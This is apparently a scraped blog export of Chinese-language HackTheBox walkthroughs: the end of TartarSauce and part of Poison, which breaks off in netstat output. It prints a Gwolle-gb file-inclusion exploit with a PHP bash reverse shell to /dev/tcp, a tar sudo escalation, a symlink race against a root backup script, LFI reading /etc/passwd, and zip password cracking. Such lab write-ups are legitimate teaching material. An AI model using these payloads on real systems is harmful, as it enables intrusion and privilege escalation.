Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ wp [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 93ms] [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 75ms] :: Progress: [30000/30000] :: Job [1/1] :: 219 req/sec :: Duration: [0:00:26] :: Errors: 2 :: 这里发现有个 wp 但是没有页面 尝试访问 http://10.10.10.88/webservices/wp/wp-admin/ 的时候，跳转到了 tartarsauce.htb ，去加入一个 hosts 解析 echo 10.10.10.88 tartarsauce.htb &gt;&gt; /etc/hosts 然后再访问就有页面了，咱们去访问一下 wp-admin 页面 成功找到后台，这个时候去使用 wpscan 扫描一下 Wpscan┌──(root㉿kali)-[~/Desktop] └─# wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p --plugins-detection aggressive _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88] [+] Started: Sat Feb 11 21:10:03 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: &#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.9.4&#39; | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: &#39;WordPress 4.9.4&#39; [i] The main theme could not be detected. [+] Enumerating Most Popular Plugins (via Aggressive Methods) Checking Known Locations - Time: 00:00:50 &lt;=================================================================================================================================&gt; (1500 / 1500) 100.00% Time: 00:00:50 [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] akismet | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/ | Last Updated: 2022-12-01T17:18:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.0.2 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200 | | Version: 4.0.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt [+] gwolle-gb | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/ | Last Updated: 2023-01-24T11:28:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | [!] The version is out of date, the latest version is 4.5.0 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200 | | Version: 2.3.10 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Feb 11 21:10:56 2023 [+] Requests Done: 1511 [+] Cached Requests: 31 [+] Data Sent: 449.789 KB [+] Data Received: 272.615 KB [+] Memory used: 194.531 MB [+] Elapsed time: 00:00:53 可以得知 wordpress 版本是 4.9.，并且有一个 Gwolle 插件，切在插件的 readme 页面中有说明版本号为 1.5.3 https://www.exploit-db.com/exploits/38861 根据描述，找到了一个漏洞 漏洞利用根据漏洞中的描述，我们来构造一下 exploit http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website] curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.6/ 上面是我们之后要运行的内容 &lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1&#39;&quot;) ?&gt; 上面是我们的 exploit 请求的 shell 文件的内容，文件名字为 wp-load.php ┌──(root㉿kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 接着使用 python3 运行一个 http 服务器 nc -nvlp 4444 接着使用 nc 监听一个端口 最后去执行我们的 exploit ┌──(root㉿kali)-[~/Desktop] └─# rlwrap nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.6] from (UNKNOWN) [10.10.10.88] 33670 bash: cannot set terminal process group (1261): Inappropriate ioctl for device bash: no job control in this shell &lt;/wp/wp-content/plugins/gwolle-gb/frontend/captcha$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功返回 shell 权限提升User&lt;/wp/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l sudo -l Matching Defaults entries for www-data on TartarSauce: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on TartarSauce: (onuma) NOPASSWD: /bin/tar 使用 sudo -l 可以看到，我们可以使用 onuma 权限执行 /bin/tar https://gtfobins.github.io/gtfobins/tar/ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh whoami&amp;&amp;id onuma uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev) 成功提权到 user 权限 cat user.txt 140682a65dccf6fbd674edb57692ae4c 成功拿到 user 权限的 flag 文件 Root2023/02/11 08:40:29 CMD: UID=0 PID=3580 | /bin/bash /usr/sbin/backuperer 运行 pspy 可以看到，会定时以 root 权限执行 &#x2F;usr&#x2F;sbin&#x2F;backuperer 这个文件，去查看一下 file /usr/sbin/backuperer /usr/sbin/backuperer: Bourne-Again shell script, UTF-8 Unicode text executable cat /usr/sbin/backuperer #!/bin/bash #------------------------------------------------------------------------------------- # backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ # ONUMA Dev auto backup program # This tool will keep our webapp backed up incase another skiddie defaces us again. # We will be able to quickly restore from a backup in seconds ;P #------------------------------------------------------------------------------------- # Set Vars Here basedir=/var/www/html bkpdir=/var/backups tmpdir=/var/tmp testmsg=$bkpdir/onuma_backup_test.txt errormsg=$bkpdir/onuma_backup_error.txt tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d&#39; &#39; -f1) check=$tmpdir/check # formatting printbdr() { for n in $(seq 72); do /usr/bin/printf $&quot;-&quot;; done } bdr=$(printbdr) # Added a test file to let us see when the last backup was run /usr/bin/printf $&quot;$bdr\\nAuto backup backuperer backup last ran at : $(/bin/date)\\n$bdr\\n&quot; &gt; $testmsg # Cleanup from last time. /bin/rm -rf $tmpdir/.* $check # Backup onuma website dev files. /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &amp; # Added delay to wait for backup to complete if large files get added. /bin/sleep 30 # Test the backup integrity integrity_chk() { /usr/bin/diff -r $basedir $check$basedir } /bin/mkdir $check /bin/tar -zxvf $tmpfile -C $check if [[ $(integrity_chk) ]] then # Report errors so the dev can investigate the issue. /usr/bin/printf $&quot;$bdr\\nIntegrity Check Error in backup last ran : $(/bin/date)\\n$bdr\\n$tmpfile\\n&quot; &gt;&gt; $errormsg integrity_chk &gt;&gt; $errormsg exit 2 else # Clean up and save archive to the bkpdir. /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak /bin/rm -rf $check .* exit 0 fi 脚本分析生成工作目录和随机临时文件名 打印标题 生成测试消息 清理 将用户上下文更改为 onuma 并将 /var/www/html 备份到临时文件中 睡 30 秒 创建用于完整性检查的目录 unatar 新建文件到check目录 执行 diff 以检查存档和文件系统之间的差异 如果没有差异清理并保存新创建的存档，备份旧的 否则将所有差异记录到日志文件 利用使用 www-data 用户在 &#x2F;var&#x2F;www&#x2F;html 下创建空文件 &lt;/wp/wp-content/plugins/gwolle-gb/frontend/captcha$ cd /var/www/html cd /var/www/html www-data@TartarSauce:/var/www/html$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@TartarSauce:/var/www/html$ touch 1 touch 1 使用 onuma 用户在 &#x2F;var&#x2F;tmp 下创建 var&#x2F;www&#x2F;html&#x2F; 结构，将 &#x2F;root&#x2F;root.txt 链接到 1 cd /var/tmp pwd /var/tmp id uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev) mkdir -p var/www/html cd var/www/html ln -s /root/root.txt 1 ls -la total 8 drwxr-xr-x 2 onuma onuma 4096 Feb 11 09:06 . drwxr-xr-x 3 onuma onuma 4096 Feb 11 09:05 .. lrwxrwxrwx 1 onuma onuma 14 Feb 11 09:06 1 -&gt; /root/root.txt 在 &#x2F;var&#x2F;tmp 中创建 tar 存档 cd /var/tmp /bin/tar -zcvf a.tgz var/www/html var/www/html/ var/www/html/1 等待脚本执行，并在 30 秒内将 a.tgz 复制到临时存档 ls -la total 112 drwxrwxrwt 11 root root 4096 Feb 11 09:10 . drwxr-xr-x 14 root root 4096 May 12 2022 .. -rw-r--r-- 1 onuma onuma 65536 Feb 11 09:10 .816e92e4f61e2b8dce68f5779ed42ad70a562348 -rw-r--r-- 1 onuma onuma 154 Feb 11 09:08 a.tgz drwxr-xr-x 3 onuma onuma 4096 Feb 11 09:05 var cp a.tgz .816e92e4f61e2b8dce68f5779ed42ad70a562348 等待检查完成 检查 &#x2F;var&#x2F;backups 下的日志文件 onuma_backup_error.txt，因为它将包含来自 &#x2F;var&#x2F;www&#x2F;html 和 a.tgz 存档的文件之间的查意，即 &#x2F;root&#x2F;root.txt 的内容 cat /var/backups/onuma_backup_error.txt ... ------------------------------------------------------------------------ Integrity Check Error in backup last ran : Thu Jan 21 05:38:54 EST 2021 ------------------------------------------------------------------------ /var/tmp/.379fe8e77f9f84a66b9a6df9a452d10499713829 Binary files /var/www/html/webservices/wp/.wp-config.php.swp and /var/tmp/check/var/www/html/webservices/wp/.wp-config.php.swp differ ------------------------------------------------------------------------ Integrity Check Error in backup last ran : Sat Feb 11 09:11:14 EST 2023 ------------------------------------------------------------------------ /var/tmp/.816e92e4f61e2b8dce68f5779ed42ad70a562348 diff -r /var/www/html/1 /var/tmp/check/var/www/html/1 0a1 &gt; 2066572c29f0ffd2a77ee5e5c2e77703 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Poison - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Poison","date":"2023-02-08T11:38:36.000Z","updated":"2023-06-13T03:49:06.000Z","comments":true,"path":"2023/02/08/Hackthebox/Medium/Hackthebox-Poison/","link":"","permalink":"http://www.lucifiel.com/2023/02/08/Hackthebox/Medium/Hackthebox-Poison/","excerpt":"","text":"Hackthebox - Poison靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.84 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-08 18:38 CST Warning: 10.10.10.84 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.84 Host is up (0.078s latency). Not shown: 52168 filtered tcp ports (no-response), 13365 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA) | 256 4ce8c602bdfc83ffc98001547d228172 (ECDSA) |_ 256 0b8fd57185901385618beb34135f943b (ED25519) 80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32) |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=2/8%OT=22%CT=8%CU=32827%PV=Y%DS=2%DC=T%G=Y%TM=63E37C05 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=RI%TS=20)OP OS:S(O1=M537NW6ST11%O2=M537NW6ST11%O3=M280NW6NNT11%O4=M537NW6ST11%O5=M218NW OS:6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)EC OS:N(R=Y%DF=Y%T=40%W=FFFF%O=M537NW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%RD OS:=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%R OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S) Network Distance: 2 hops Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 122.13 ms 10.10.16.1 2 77.21 ms 10.10.10.84 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.22 seconds Http 似乎是一个本地脚本加载的一个程序，挨个看一下是否有什么可用的东西 ┌──(root㉿kali)-[~/Desktop] └─# curl http://10.10.10.84/browse.php?file=listfiles.php Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; browse.php [3] =&gt; index.php [4] =&gt; info.php [5] =&gt; ini.php [6] =&gt; listfiles.php [7] =&gt; phpinfo.php [8] =&gt; pwdbackup.txt ) 漏洞利用有点东西，这是列出了一个列表吧，然后看到文件结构，突然想到是否会有 LFI 呢？尝试一下 ┌──(root㉿kali)-[~/Desktop] └─# curl http://10.10.10.84/browse.php?file=/etc/passwd # $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &amp;:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &amp;:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh nice，存在 LFI 漏洞，筛选一下可用账户先 ┌──(root㉿kali)-[~/Desktop] └─# curl http://10.10.10.84/browse.php?file=../../../../../etc/passwd|grep &quot;/bin/csh&quot; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1894 100 1894 0 0 11999 0 --:--:-- --:--:-- --:--:-- 12063 root:*:0:0:Charlie &amp;:/root:/bin/csh charix:*:1001:1001:charix:/home/charix:/bin/csh 发现可以使用 bash 权限的用户就两个，一个是 root，一个是 charix，咱们肯定不可能直接到 root 吧？那我们就肯定是要找 charix 的突破点了 ┌──(root㉿kali)-[~/Desktop] └─# curl http://10.10.10.84/browse.php?file=pwdbackup.txt This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= 有一段 base64，解密一下看看 This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really.. 这个密码是安全的，它至少被编译了 13 次...真的会出什么问题... 这他喵的居然得解密 13 次，真麻烦 ┌──(root㉿kali)-[~/Desktop] └─# echo &quot;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=&quot;|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d Charix!2#4%6&amp;8(0 最后得到了一个密码，去尝试是否可以登录 ssh ┌──(root㉿kali)-[~/Desktop] └─# ssh charix@10.10.10.84 The authenticity of host &#39;10.10.10.84 (10.10.10.84)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.84&#39; (ED25519) to the list of known hosts. (charix@10.10.10.84) Password for charix@Poison: Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017 Welcome to FreeBSD! Release Notes, Errata: https://www.FreeBSD.org/releases/ Security Advisories: https://www.FreeBSD.org/security/ FreeBSD Handbook: https://www.FreeBSD.org/handbook/ FreeBSD FAQ: https://www.FreeBSD.org/faq/ Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/ FreeBSD Forums: https://forums.FreeBSD.org/ Documents installed with the system are in the /usr/local/share/doc/freebsd/ directory, or can be installed later with: pkg install en-freebsd-doc For other languages, replace &quot;en&quot; with a language code like de or fr. Show the version of FreeBSD installed: freebsd-version ; uname -a Please include that output and any error messages when posting questions. Introduction to manual pages: man man FreeBSD directory layout: man hier Edit /etc/motd to change this login announcement. If you want to play CDs with FreeBSD, a utility for this is already included. Type &#39;cdcontrol&#39; then &#39;help&#39; to learn more. (You may need to set the CDROM environment variable in order to make cdcontrol want to start.) charix@Poison:~ % whoami&amp;&amp;id charix uid=1001(charix) gid=1001(charix) groups=1001(charix) 成功登录 ssh charix@Poison:~ % cat user.txt eaacdfb2d141b72a589233063604209c 成功拿到 user 权限的 flag 文件 权限提升charix@Poison:~ % ls secret.zip user.txt charix@Poison:~ % ls -la total 48 drwxr-x--- 2 charix charix 512 Mar 19 2018 . drwxr-xr-x 3 root wheel 512 Mar 19 2018 .. -rw-r----- 1 charix charix 1041 Mar 19 2018 .cshrc -rw-rw---- 1 charix charix 0 Mar 19 2018 .history -rw-r----- 1 charix charix 254 Mar 19 2018 .login -rw-r----- 1 charix charix 163 Mar 19 2018 .login_conf -rw-r----- 1 charix charix 379 Mar 19 2018 .mail_aliases -rw-r----- 1 charix charix 336 Mar 19 2018 .mailrc -rw-r----- 1 charix charix 802 Mar 19 2018 .profile -rw-r----- 1 charix charix 281 Mar 19 2018 .rhosts -rw-r----- 1 charix charix 849 Mar 19 2018 .shrc -rw-r----- 1 root charix 166 Mar 19 2018 secret.zip -rw-r----- 1 root charix 33 Mar 19 2018 user.txt 这里有一个 secret.zip 的文件，下载下来看看 ┌──(root㉿kali)-[~/Desktop] └─# scp charix@10.10.10.84:/home/charix/secret.zip ./ (charix@10.10.10.84) Password for charix@Poison: secret.zip ┌──(root㉿kali)-[~/Desktop] └─# file secret.zip secret.zip: Zip archive data, at least v2.0 to extract, compression method=store 确实是 zip 类型的 ┌──(root㉿kali)-[~/Desktop] └─# unzip secret.zip Archive: secret.zip [secret.zip] secret password: 但是需要一个解压密码，去破解一下 ┌──(root㉿kali)-[~/Desktop] └─# zip2john secret.zip &gt; hash ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827 ts=9827 cs=7753 type=0 ┌──(root㉿kali)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:00 DONE (2023-02-08 19:04) 0g/s 16299Kp/s 16299Kc/s 16299KC/s &quot;2parrow&quot;..*7¡Vamos! Session completed. 爆破没有成功，尝试一下 charix 的登录密码呢？ ┌──(root㉿kali)-[~/Desktop] └─# unzip secret.zip Archive: secret.zip [secret.zip] secret password: extracting: secret 好吧，是我给想复杂了 ┌──(root㉿kali)-[~/Desktop] └─# file secret secret: Non-ISO extended-ASCII text, with no line terminators ┌──(root㉿kali)-[~/Desktop] └─# chmod +x secret ┌──(root㉿kali)-[~/Desktop] └─# ./secret ./secret: 1: ��[: not found ./secret: 1: Ֆz!: not found 不是可执行文件，先放着吧，去看看本地端口 charix@Poison:~ % netstat -an Active Internet connections (including servers) Proto Recv-Q Send-Q Local Address Foreign Address (state) tcp4 0 0 10.10.10.84.22 10.10.16.2.46492 ESTABLISHED tcp4 0 0 127.0.0.1.25 *.* LISTEN tcp4 0 0 *.80 *.* LISTEN tcp6 0 0 *.80 *.* LISTEN tcp4 0 0 *.22 *.* LISTEN tcp6 0 0 *.22 *.* LISTEN tcp4 0 0 127.0.0.1.5801 *.* LISTEN tcp4 0 0 127.0.0.1.5901 *.* LISTEN udp4 0 0 *.514 *.* udp6 0 0 *.514 *.* Active UNIX domain sockets Address Type Recv-Q Send-Q Inode Conn Refs Nextref Addr fffff80003b39d20 stream 0 0 0 fffff80003b39e10 0 0 fffff80003b39e10 stream 0 0 0 fffff80003b39d20 0 0 fffff80003b3a2d0 stream 0 0 0 fffff80003b3a3c0 0 0 /tmp/.X11-unix/X1 fffff80003b3a3c0 stream 0 0 0 fffff80003b3a2d0 0 0 fffff80003b3a5a0 stream 0 0 0 fffff80003b3a4b0 0 0 /tmp/.X11-unix/X1 fffff80003b3a4b0 stream 0 0 0 fffff80003b3a5a0 0 0 fffff80003b3a690 stream 0 0 fffff80003b32588 0 0 0 /tmp/.X11-unix/X1 fffff80003b3ab40 stream 0 0 fffff80003ae6938 0 0 0 /var/run/devd.pipe fffff80003b3a0f0 dgram 0 0 0 fffff80003b3a960 0 0 fffff80003b3a1e0 dgram 0 0 0 fffff80003b3a870 0 fffff80003b3a780 fffff80003b3a780 dgram 0 0 0 fffff80003b3a870 0 0 fffff80003b3a870 dgram 0 0 fffff80003c56000 0 fffff80003b3a1e0 0 